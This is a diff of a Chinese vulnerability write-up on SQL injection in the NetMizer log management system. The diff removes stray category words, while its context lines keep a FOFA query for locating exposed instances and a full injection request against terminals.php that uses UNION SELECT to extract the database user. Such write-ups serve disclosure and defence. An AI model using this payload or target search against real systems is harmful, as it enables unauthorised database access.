@@ -14,14 +14,6 @@ NetMizer日志管理系统是一款专为网络流量管理和优化设计的日
 
 老旧版本
 
-深入探索
-
-计算机服务器
-
-计算机科学
-
-书籍
-
 # fofa语法
 
 `body="日志管理系统" && body="NetMizer"`
@@ -67,7 +59,7 @@ else if(1||$action == 'phonelist-bar'){
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
 
-软件
+网络安全
 
 ## newdevicezone
 
@@ -75,14 +67,6 @@ else if(1||$action == 'phonelist-bar'){
 GET /data/echart/terminals.php?action=phonelist-grid&newdevicezone=ip:0%20-111+UNION+ALL+SELECT+null,CONCAT(0x7e,(select/**/user()),0x7e),null,null,null,null,null-- HTTP/1.1
 Host: netmizer.mrxn.net
 ```
-
-深入探索
-
-搜索引擎
-
-代理
-
-内容管理系统
 
 ## device
 
